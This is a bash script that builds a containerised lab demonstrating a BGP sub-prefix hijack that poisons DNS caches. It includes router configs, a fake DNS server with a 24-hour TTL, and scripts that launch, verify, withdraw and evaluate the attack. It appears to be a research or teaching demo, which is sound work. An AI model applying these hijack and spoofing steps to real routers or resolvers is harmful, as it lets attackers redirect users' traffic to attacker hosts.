#!/bin/bash
# ============================================================
# BGP DNS Hijack Lab v5 - Complete Setup
# Plan C: BGP Hijack -> DNS Cache Poisoning Chain
# ============================================================
# Topology:
#
#   dns-server --- R3 (AS300 Victim)
#                    |
#                  R2 (AS200 Transit)
#                 /        \
#    R1 (AS100)          R5 (AS500 Transit2)
#        |                     |
#    R4 (AS400 Attacker)   R6 (AS600 Client)
#        |                     |
#    fake-dns              client
#
# DNS server (13.0.0.50) is in AS300's 13.0.0.0/24
# Attacker hijacks 13.0.0.0/25 (sub-prefix) to redirect DNS
# Client in AS600 gets poisoned DNS responses
# After withdrawal, cached poison persists (86400s TTL)
# ============================================================

set -e
cd "$(dirname "$0")"

echo "=== BGP DNS Hijack Lab v4 Setup ==="
echo ""

# ---- Dockerfile ----
cat > Dockerfile.dns << 'DNSEOF'
FROM alpine:3.18
RUN apk add --no-cache dnsmasq bind-tools unbound curl iputils-ping traceroute iproute2 tcpdump
CMD ["sleep", "infinity"]
DNSEOF

# ---- Topology ----
cat > topology.yaml << 'TOPOEOF'
name: bgp-dns-hijack

topology:
  nodes:
    r1:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r1/frr.conf:/etc/frr/frr.conf
        - configs/r1/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1
    r2:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r2/frr.conf:/etc/frr/frr.conf
        - configs/r2/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1
    r3:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r3/frr.conf:/etc/frr/frr.conf
        - configs/r3/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1
    r4:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r4/frr.conf:/etc/frr/frr.conf
        - configs/r4/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1
    r5:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r5/frr.conf:/etc/frr/frr.conf
        - configs/r5/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1
    r6:
      kind: linux
      image: quay.io/frrouting/frr:9.1.0
      binds:
        - configs/r6/frr.conf:/etc/frr/frr.conf
        - configs/r6/daemons:/etc/frr/daemons
      exec:
        - sysctl -w net.ipv4.ip_forward=1

    dns-server:
      kind: linux
      image: dns-lab:latest
      binds:
        - configs/dns/legit-dnsmasq.conf:/etc/dnsmasq.conf
      exec:
        - ip addr add 10.30.0.2/30 dev eth1
        - ip addr add 13.0.0.50/32 dev lo
        - ip link set eth1 up
        - ip route add default via 10.30.0.1
        - dnsmasq
    fake-dns:
      kind: linux
      image: dns-lab:latest
      binds:
        - configs/dns/fake-dnsmasq.conf:/etc/dnsmasq.conf
      exec:
        - ip addr add 10.40.0.2/30 dev eth1
        - ip addr add 13.0.0.50/32 dev lo
        - ip link set eth1 up
        - ip route add default via 10.40.0.1
        - dnsmasq
    client:
      kind: linux
      image: dns-lab:latest
      binds:
        - configs/dns/unbound.conf:/etc/unbound/unbound.conf
      exec:
        - ip addr add 10.60.0.2/30 dev eth1
        - ip link set eth1 up
        - ip route add default via 10.60.0.1

  links:
    - endpoints: ["r1:eth1", "r2:eth1"]
    - endpoints: ["r2:eth2", "r3:eth1"]
    - endpoints: ["r1:eth2", "r4:eth1"]
    - endpoints: ["r2:eth3", "r5:eth1"]
    - endpoints: ["r5:eth2", "r6:eth1"]
    - endpoints: ["r3:eth2", "dns-server:eth1"]
    - endpoints: ["r4:eth2", "fake-dns:eth1"]
    - endpoints: ["r6:eth2", "client:eth1"]
TOPOEOF

# ---- Daemons file (shared by all routers) ----
DAEMONS_CONTENT="bgpd=yes
zebra=yes
staticd=yes
ospfd=no
ospf6d=no
ripd=no
ripngd=no
isisd=no
pimd=no
ldpd=no
nhrpd=no
eigrpd=no
babeld=no
sharpd=no
pbrd=no
bfdd=no
fabricd=no
vrrpd=no
pathd=no"

for r in r1 r2 r3 r4 r5 r6; do
  echo "$DAEMONS_CONTENT" > configs/$r/daemons
done

# ---- R1 (AS100 Observer) ----
cat > configs/r1/frr.conf << 'EOF'
frr defaults traditional
hostname r1
!
interface eth1
 ip address 10.12.0.1/30
!
interface eth2
 ip address 10.14.0.1/30
!
interface lo
 ip address 11.0.0.1/24
!
router bgp 100
 bgp router-id 1.1.1.1
 neighbor 10.12.0.2 remote-as 200
 neighbor 10.14.0.2 remote-as 400
 !
 address-family ipv4 unicast
  network 11.0.0.0/24
  neighbor 10.12.0.2 activate
  neighbor 10.14.0.2 activate
 exit-address-family
!
ip forwarding
!
EOF

# ---- R2 (AS200 Transit) ----
cat > configs/r2/frr.conf << 'EOF'
frr defaults traditional
hostname r2
!
interface eth1
 ip address 10.12.0.2/30
!
interface eth2
 ip address 10.23.0.1/30
!
interface eth3
 ip address 10.25.0.1/30
!
interface lo
 ip address 12.0.0.1/24
!
router bgp 200
 bgp router-id 2.2.2.2
 neighbor 10.12.0.1 remote-as 100
 neighbor 10.23.0.2 remote-as 300
 neighbor 10.25.0.2 remote-as 500
 !
 address-family ipv4 unicast
  network 12.0.0.0/24
  neighbor 10.12.0.1 activate
  neighbor 10.23.0.2 activate
  neighbor 10.25.0.2 activate
 exit-address-family
!
ip forwarding
!
EOF

# ---- R3 (AS300 Victim + DNS host) ----
cat > configs/r3/frr.conf << 'EOF'
frr defaults traditional
hostname r3
!
interface eth1
 ip address 10.23.0.2/30
!
interface eth2
 ip address 10.30.0.1/30
!
interface lo
 ip address 13.0.0.1/24
!
router bgp 300
 bgp router-id 3.3.3.3
 neighbor 10.23.0.1 remote-as 200
 !
 address-family ipv4 unicast
  network 13.0.0.0/24
  neighbor 10.23.0.1 activate
 exit-address-family
!
! Static route to reach DNS server at 13.0.0.50
ip route 13.0.0.50/32 10.30.0.2
!
ip forwarding
!
EOF

# ---- R4 (AS400 Attacker + Fake DNS host) ----
# NOTE: No hijack routes at startup — added dynamically by attack script
cat > configs/r4/frr.conf << 'EOF'
frr defaults traditional
hostname r4
!
interface eth1
 ip address 10.14.0.2/30
!
interface eth2
 ip address 10.40.0.1/30
!
interface lo
 ip address 14.0.0.1/24
!
router bgp 400
 bgp router-id 4.4.4.4
 neighbor 10.14.0.1 remote-as 100
 !
 address-family ipv4 unicast
  network 14.0.0.0/24
  neighbor 10.14.0.1 activate
 exit-address-family
!
ip forwarding
!
EOF

# ---- R5 (AS500 Transit2) ----
cat > configs/r5/frr.conf << 'EOF'
frr defaults traditional
hostname r5
!
interface eth1
 ip address 10.25.0.2/30
!
interface eth2
 ip address 10.56.0.1/30
!
interface lo
 ip address 15.0.0.1/24
!
router bgp 500
 bgp router-id 5.5.5.5
 neighbor 10.25.0.1 remote-as 200
 neighbor 10.56.0.2 remote-as 600
 !
 address-family ipv4 unicast
  network 15.0.0.0/24
  neighbor 10.25.0.1 activate
  neighbor 10.56.0.2 activate
 exit-address-family
!
ip forwarding
!
EOF

# ---- R6 (AS600 Client network) ----
cat > configs/r6/frr.conf << 'EOF'
frr defaults traditional
hostname r6
!
interface eth1
 ip address 10.56.0.2/30
!
interface eth2
 ip address 10.60.0.1/30
!
interface lo
 ip address 16.0.0.1/24
!
router bgp 600
 bgp router-id 6.6.6.6
 neighbor 10.56.0.1 remote-as 500
 !
 address-family ipv4 unicast
  network 16.0.0.0/24
  neighbor 10.56.0.1 activate
 exit-address-family
!
ip forwarding
!
EOF

# ---- DNS Configs ----

# Legitimate DNS server (AS300 victim's authoritative DNS)
cat > configs/dns/legit-dnsmasq.conf << 'EOF'
# Legitimate DNS Server for victim.lab
# Runs in AS300 (Victim network) at 13.0.0.50
no-resolv
no-hosts
no-daemon
log-queries
local-ttl=300
address=/www.victim.lab/13.0.0.100
address=/login.victim.lab/13.0.0.80
address=/mail.victim.lab/13.0.0.25
address=/api.victim.lab/13.0.0.90
address=/ns.victim.lab/13.0.0.50
EOF

# Fake DNS server (AS400 attacker's spoofed responses)
cat > configs/dns/fake-dnsmasq.conf << 'EOF'
# ATTACKER Fake DNS Server
# Runs in AS400 (Attacker network)
# Responds to ALL queries for victim.lab with attacker IP
# Uses 86400s TTL (24 hours) to maximize cache poisoning persistence
no-resolv
no-hosts
no-daemon
log-queries
local-ttl=86400
address=/www.victim.lab/14.0.0.66
address=/login.victim.lab/14.0.0.66
address=/mail.victim.lab/14.0.0.66
address=/api.victim.lab/14.0.0.66
address=/ns.victim.lab/14.0.0.66
EOF

# Unbound caching resolver config (runs on client in AS600)
cat > configs/dns/unbound.conf << 'EOF'
server:
    interface: 127.0.0.1
    port: 53
    access-control: 127.0.0.0/8 allow
    do-not-query-localhost: no
    verbosity: 1
    logfile: "/var/log/unbound.log"
    # Disable DNSSEC for lab (no real trust anchors)
    val-permissive-mode: yes
    # Cache settings
    cache-min-ttl: 0
    cache-max-ttl: 86400
    msg-cache-size: 4m
    rrset-cache-size: 4m

forward-zone:
    name: "."
    forward-addr: 13.0.0.50
EOF

# ---- Attack Scripts ----

# Verify BGP convergence
cat > scripts/verify.sh << 'SCRIPT'
#!/bin/bash
echo "=== BGP DNS Hijack Lab v4 — Verification ==="
echo ""

echo "[1] Checking BGP sessions on all routers..."
for r in r1 r2 r3 r4 r5 r6; do
  PEERS=$(docker exec clab-bgp-dns-hijack-$r vtysh -c "show bgp summary" 2>/dev/null | grep -c "Estab" || echo "0")
  echo "  $r: $PEERS established BGP sessions"
done

echo ""
echo "[2] Checking 13.0.0.0/24 path from R1 (AS100)..."
docker exec clab-bgp-dns-hijack-r1 vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo "[3] Checking 13.0.0.0/24 path from R6 (AS600)..."
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo "[4] Checking DNS server reachability from client..."
docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=3 2>/dev/null
RESULT=$?
if [ $RESULT -eq 0 ]; then
  echo "  DNS server reachable from client ✓"
else
  echo "  DNS server NOT reachable from client ✗"
  echo "  (Wait 30-60s for BGP convergence and retry)"
fi

echo ""
echo "[5] Checking DNS caching resolver on client..."
docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=3 2>/dev/null
if [ $? -eq 0 ]; then
  echo "  Local caching resolver working ✓"
else
  echo "  Local caching resolver NOT working ✗"
  echo "  Trying to start unbound..."
  docker exec clab-bgp-dns-hijack-client unbound -c /etc/unbound/unbound.conf 2>/dev/null
fi

echo ""
echo "=== Verification Complete ==="
SCRIPT
chmod +x scripts/verify.sh

# DNS Baseline test
cat > scripts/dns_baseline.sh << 'SCRIPT'
#!/bin/bash
echo "=== Phase 1: DNS Baseline (No Attack) ==="
echo ""
echo "[1] Direct query to DNS server (13.0.0.50) from client:"
echo "    dig @13.0.0.50 www.victim.lab"
docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +ttlid +timeout=5
echo ""

echo "[2] Query through caching resolver from client:"
echo "    dig @127.0.0.1 www.victim.lab"
docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +ttlid +timeout=5
echo ""

echo "[3] Traceroute from client to DNS server:"
docker exec clab-bgp-dns-hijack-client traceroute -n -w 2 -q 1 13.0.0.50 2>/dev/null
echo ""

echo "[4] Expected: www.victim.lab -> 13.0.0.100 (legitimate)"
echo "    Path: Client -> R6(AS600) -> R5(AS500) -> R2(AS200) -> R3(AS300) -> DNS"
echo ""
echo "=== Baseline Complete ==="
SCRIPT
chmod +x scripts/dns_baseline.sh

# Start DNS hijack attack
cat > scripts/start_dns_hijack.sh << 'SCRIPT'
#!/bin/bash
echo "=== Phase 2: Launching Sub-Prefix Hijack on DNS Server ==="
echo ""
echo "[1] AS400 (Attacker) announcing 13.0.0.0/25 (sub-prefix of victim's /24)..."
echo "    This covers the DNS server at 13.0.0.50"
echo ""

# Add static route on R4 so hijacked traffic reaches fake-dns
docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "ip route 13.0.0.0/25 10.40.0.2" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "network 13.0.0.0/25" \
  -c "end"

echo "[2] Waiting 10s for BGP convergence..."
sleep 10

echo "[3] Verifying hijack propagation on R2 (Transit):"
docker exec clab-bgp-dns-hijack-r2 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"

echo ""
echo "[4] Verifying hijack propagation on R6 (Client's AS):"
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"

echo ""
echo "=== Sub-Prefix Hijack Active ==="
echo "    DNS queries to 13.0.0.50 now route to AS400 (attacker)"
SCRIPT
chmod +x scripts/start_dns_hijack.sh

# Verify DNS poisoning during attack
cat > scripts/verify_dns_poison.sh << 'SCRIPT'
#!/bin/bash
echo "=== Phase 3: Verifying DNS Poisoning During Attack ==="
echo ""

echo "[1] Flush client's DNS cache (restart unbound)..."
docker exec clab-bgp-dns-hijack-client pkill unbound 2>/dev/null
sleep 1
docker exec clab-bgp-dns-hijack-client unbound -c /etc/unbound/unbound.conf 2>/dev/null
sleep 1

echo ""
echo "[2] Direct query to 13.0.0.50 from client (now routed to attacker):"
ANSWER=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "    www.victim.lab -> $ANSWER"
if [ "$ANSWER" = "14.0.0.66" ]; then
  echo "    *** DNS POISONED — Response from ATTACKER (14.0.0.66) ***"
elif [ "$ANSWER" = "13.0.0.100" ]; then
  echo "    Response from legitimate server (13.0.0.100) — hijack not effective"
else
  echo "    Unexpected response: $ANSWER"
fi

echo ""
echo "[3] Query through caching resolver (populates cache with poison):"
CACHED=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "    www.victim.lab -> $CACHED"

echo ""
echo "[4] Full DNS response showing TTL (notice 86400s attacker TTL):"
docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +timeout=5 2>/dev/null | grep -A5 "ANSWER SECTION"

echo ""
echo "[5] Traceroute from client to 13.0.0.50 (should show attacker path):"
docker exec clab-bgp-dns-hijack-client traceroute -n -w 2 -q 1 13.0.0.50 2>/dev/null

echo ""
echo "[6] Compare: BGP table on R6 for 13.0.0.0/24 vs 13.0.0.0/25"
echo "    --- Legitimate /24 route ---"
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/24" 2>/dev/null | grep -E "AS path|best"
echo "    --- Hijacked /25 route ---"
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25" 2>/dev/null | grep -E "AS path|best"
echo ""
echo "=== DNS Poisoning Verified ==="
SCRIPT
chmod +x scripts/verify_dns_poison.sh

# Stop attack
cat > scripts/stop_dns_hijack.sh << 'SCRIPT'
#!/bin/bash
echo "=== Phase 4: Withdrawing Hijack ==="
echo ""
echo "[1] AS400 withdrawing 13.0.0.0/25..."

docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "no network 13.0.0.0/25" \
  -c "end" \
  -c "configure terminal" \
  -c "no ip route 13.0.0.0/25 10.40.0.2" \
  -c "end"

echo "[2] Waiting 10s for BGP withdrawal propagation..."
sleep 10

echo "[3] Confirm withdrawal — R6 should no longer have /25 route:"
docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/25" 2>/dev/null
echo ""
echo "=== Hijack Withdrawn ==="
SCRIPT
chmod +x scripts/stop_dns_hijack.sh

# Verify cache persistence after attack ends
cat > scripts/verify_cache_persistence.sh << 'SCRIPT'
#!/bin/bash
echo "=== Phase 5: Cache Poisoning Persistence (Post-Attack) ==="
echo ""
echo "The BGP hijack has been withdrawn. Routes are now clean."
echo "But the DNS cache on the client still has the POISONED entry."
echo ""

echo "[1] Direct query to real DNS (should be legitimate again):"
DIRECT=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "    Direct:  www.victim.lab -> $DIRECT"

echo ""
echo "[2] Cached query (should STILL be poisoned from attacker TTL=86400):"
CACHED=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "    Cached:  www.victim.lab -> $CACHED"

echo ""
if [ "$DIRECT" = "13.0.0.100" ] && [ "$CACHED" = "14.0.0.66" ]; then
  echo "*** CRITICAL FINDING ***"
  echo "Direct DNS now returns legitimate answer (13.0.0.100)"
  echo "But cached resolver STILL returns attacker answer (14.0.0.66)"
  echo "The poisoned cache entry persists for up to 86400 seconds (24 hours)"
  echo "even though the BGP hijack lasted only seconds/minutes."
  echo ""
  echo "This confirms the attack chain described in:"
  echo "  - Birge-Lee et al., 'Bamboozling CAs with BGP' (USENIX Security 2018)"
  echo "  - Kowalski & Mazurczyk, Routing Security Survey (Computer Networks 2023)"
elif [ "$CACHED" = "13.0.0.100" ]; then
  echo "Cache returned legitimate answer — try running Phase 3 again"
  echo "to populate the cache during the attack window."
else
  echo "Direct: $DIRECT  |  Cached: $CACHED"
  echo "Check if unbound is running: docker exec clab-bgp-dns-hijack-client pgrep unbound"
fi

echo ""
echo "[3] Show unbound cache dump (poisoned entries):"
docker exec clab-bgp-dns-hijack-client unbound-control dump_cache 2>/dev/null | grep -A2 "victim.lab" || echo "  (unbound-control not available, use dig to verify)"

echo ""
echo "=== Cache Persistence Check Complete ==="
SCRIPT
chmod +x scripts/verify_cache_persistence.sh

# Full automated demo
cat > scripts/full_demo.sh << 'SCRIPT'
#!/bin/bash
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  BGP Hijack -> DNS Cache Poisoning — Full Demo          ║"
echo "║  Plan C: Application-Layer Impact Chain                  ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "Press ENTER to proceed through each phase..."
read -p ""

echo ""
echo "────────────────────────────────────────────────────────────"
bash scripts/dns_baseline.sh
echo "────────────────────────────────────────────────────────────"
read -p "Press ENTER to launch the attack..."

echo ""
echo "────────────────────────────────────────────────────────────"
bash scripts/start_dns_hijack.sh
echo "────────────────────────────────────────────────────────────"
sleep 3
read -p "Press ENTER to verify DNS poisoning..."

echo ""
echo "────────────────────────────────────────────────────────────"
bash scripts/verify_dns_poison.sh
echo "────────────────────────────────────────────────────────────"
read -p "Press ENTER to withdraw the hijack..."

echo ""
echo "────────────────────────────────────────────────────────────"
bash scripts/stop_dns_hijack.sh
echo "────────────────────────────────────────────────────────────"
read -p "Press ENTER to verify cache persistence..."

echo ""
echo "────────────────────────────────────────────────────────────"
bash scripts/verify_cache_persistence.sh
echo "────────────────────────────────────────────────────────────"

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  Demo Complete                                           ║"
echo "║                                                          ║"
echo "║  Key Finding: A brief BGP sub-prefix hijack produces     ║"
echo "║  DNS cache poisoning that persists for HOURS after       ║"
echo "║  the routing attack ends.                                ║"
echo "║                                                          ║"
echo "║  Attack duration: seconds  |  Poison duration: 24 hours  ║"
echo "╚══════════════════════════════════════════════════════════╝"
SCRIPT
chmod +x scripts/full_demo.sh

# Automated evaluation with CSV output
cat > scripts/evaluate_dns_chain.sh << 'SCRIPT'
#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="evaluation_dns_${TIMESTAMP}.log"
CSV="evaluation_dns_${TIMESTAMP}.csv"

echo "=== BGP DNS Hijack Chain Evaluation ===" | tee "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo ""

echo "phase,test,result,expected,pass" > "$CSV"

# Phase 1: Baseline
echo "--- Phase 1: Baseline ---" | tee -a "$LOG"

BASELINE_DNS=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Baseline DNS query: $BASELINE_DNS" | tee -a "$LOG"
if [ "$BASELINE_DNS" = "13.0.0.100" ]; then
  echo "baseline,direct_dns,$BASELINE_DNS,13.0.0.100,PASS" >> "$CSV"
else
  echo "baseline,direct_dns,$BASELINE_DNS,13.0.0.100,FAIL" >> "$CSV"
fi

BASELINE_PATH=$(docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/24" 2>/dev/null | grep "AS path" | head -1)
echo "Baseline BGP path from R6: $BASELINE_PATH" | tee -a "$LOG"
echo "baseline,bgp_path_r6,\"$BASELINE_PATH\",contains_300,INFO" >> "$CSV"

# Phase 2: Attack
echo "" | tee -a "$LOG"
echo "--- Phase 2: Sub-prefix Hijack ---" | tee -a "$LOG"
ATTACK_START=$(date +%s)

docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "ip route 13.0.0.0/25 10.40.0.2" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "network 13.0.0.0/25" \
  -c "end" 2>/dev/null

echo "Hijack announced, waiting 10s..." | tee -a "$LOG"
sleep 10
ATTACK_CONVERGE=$(date +%s)
CONVERGE_TIME=$((ATTACK_CONVERGE - ATTACK_START))
echo "Convergence time: ${CONVERGE_TIME}s" | tee -a "$LOG"
echo "attack,convergence_time,${CONVERGE_TIME}s,<15s,INFO" >> "$CSV"

# Flush and test
docker exec clab-bgp-dns-hijack-client pkill unbound 2>/dev/null
sleep 1
docker exec clab-bgp-dns-hijack-client unbound -c /etc/unbound/unbound.conf 2>/dev/null
sleep 1

# Phase 3: Verify poisoning
echo "" | tee -a "$LOG"
echo "--- Phase 3: DNS Poisoning Check ---" | tee -a "$LOG"

POISON_DNS=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "DNS during hijack (direct): $POISON_DNS" | tee -a "$LOG"
if [ "$POISON_DNS" = "14.0.0.66" ]; then
  echo "attack,dns_poisoned,$POISON_DNS,14.0.0.66,PASS" >> "$CSV"
  echo "  -> DNS POISONED SUCCESSFULLY" | tee -a "$LOG"
else
  echo "attack,dns_poisoned,$POISON_DNS,14.0.0.66,FAIL" >> "$CSV"
fi

# Populate cache through resolver
CACHED_POISON=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "DNS during hijack (cached): $CACHED_POISON" | tee -a "$LOG"
echo "attack,cached_poison,$CACHED_POISON,14.0.0.66,INFO" >> "$CSV"

# Check traceroute during hijack
TRACEROUTE_HIJACK=$(docker exec clab-bgp-dns-hijack-client traceroute -n -w 2 -q 1 13.0.0.50 2>/dev/null | tail -1)
echo "Traceroute during hijack: $TRACEROUTE_HIJACK" | tee -a "$LOG"

# Phase 4: Withdraw
echo "" | tee -a "$LOG"
echo "--- Phase 4: Withdraw Hijack ---" | tee -a "$LOG"

docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "no network 13.0.0.0/25" \
  -c "end" \
  -c "configure terminal" \
  -c "no ip route 13.0.0.0/25 10.40.0.2" \
  -c "end" 2>/dev/null

echo "Hijack withdrawn, waiting 10s..." | tee -a "$LOG"
sleep 10

# Phase 5: Cache persistence
echo "" | tee -a "$LOG"
echo "--- Phase 5: Post-Attack Cache Persistence ---" | tee -a "$LOG"

POST_DIRECT=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Post-attack DNS (direct): $POST_DIRECT" | tee -a "$LOG"
if [ "$POST_DIRECT" = "13.0.0.100" ]; then
  echo "post_attack,direct_dns_restored,$POST_DIRECT,13.0.0.100,PASS" >> "$CSV"
else
  echo "post_attack,direct_dns_restored,$POST_DIRECT,13.0.0.100,FAIL" >> "$CSV"
fi

POST_CACHED=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Post-attack DNS (cached): $POST_CACHED" | tee -a "$LOG"
if [ "$POST_CACHED" = "14.0.0.66" ]; then
  echo "post_attack,cache_still_poisoned,$POST_CACHED,14.0.0.66,PASS" >> "$CSV"
  echo "  -> CACHE STILL POISONED after hijack withdrawal!" | tee -a "$LOG"
else
  echo "post_attack,cache_still_poisoned,$POST_CACHED,14.0.0.66,FAIL" >> "$CSV"
fi

echo "" | tee -a "$LOG"
echo "=== Summary ===" | tee -a "$LOG"
echo "Baseline DNS: $BASELINE_DNS (expected: 13.0.0.100)" | tee -a "$LOG"
echo "During hijack: $POISON_DNS (expected: 14.0.0.66 = attacker)" | tee -a "$LOG"
echo "Post-attack direct: $POST_DIRECT (expected: 13.0.0.100 = restored)" | tee -a "$LOG"
echo "Post-attack cached: $POST_CACHED (expected: 14.0.0.66 = still poisoned)" | tee -a "$LOG"
echo "" | tee -a "$LOG"
echo "Attack duration: ~${CONVERGE_TIME}s + hijack window" | tee -a "$LOG"
echo "Poison persistence: up to 86400s (24 hours) per attacker TTL" | tee -a "$LOG"
echo "" | tee -a "$LOG"
echo "Results saved to: $CSV" | tee -a "$LOG"
echo "Full log saved to: $LOG" | tee -a "$LOG"
echo "Completed: $(date)" | tee -a "$LOG"
SCRIPT
chmod +x scripts/evaluate_dns_chain.sh

# Capture BGP updates
cat > scripts/capture_bgp.sh << 'SCRIPT'
#!/bin/bash
echo "Capturing BGP packets on R2 (Transit)..."
echo "Press Ctrl+C to stop capture"
docker exec clab-bgp-dns-hijack-r2 tcpdump -i any -w /tmp/bgp_capture.pcap port 179 &
TCPDUMP_PID=$!
echo "Capture PID: $TCPDUMP_PID"
echo "Run attack in another terminal, then stop with: kill $TCPDUMP_PID"
echo "Copy pcap: docker cp clab-bgp-dns-hijack-r2:/tmp/bgp_capture.pcap ."
wait $TCPDUMP_PID
SCRIPT
chmod +x scripts/capture_bgp.sh

# Teardown
cat > scripts/teardown.sh << 'SCRIPT'
#!/bin/bash
echo "Destroying lab..."
cd "$(dirname "$0")/.."
sudo containerlab destroy -t topology.yaml --cleanup
echo "Done."
SCRIPT
chmod +x scripts/teardown.sh

echo ""
echo "=== All config files generated ==="
echo ""
echo "Directory structure:"
find . -type f | sort | head -40
echo ""
echo "=== Next Steps ==="
echo "1. Build DNS Docker image:"
echo "   sudo docker build -t dns-lab:latest -f Dockerfile.dns ."
echo ""
echo "2. Deploy the lab:"
echo "   sudo containerlab deploy -t topology.yaml"
echo ""
echo "3. Wait 30-60s for BGP convergence, then verify:"
echo "   bash scripts/verify.sh"
echo ""
echo "4. Run the full demo:"
echo "   bash scripts/full_demo.sh"
echo ""
echo "5. Or run automated evaluation:"
echo "   bash scripts/evaluate_dns_chain.sh"
echo ""
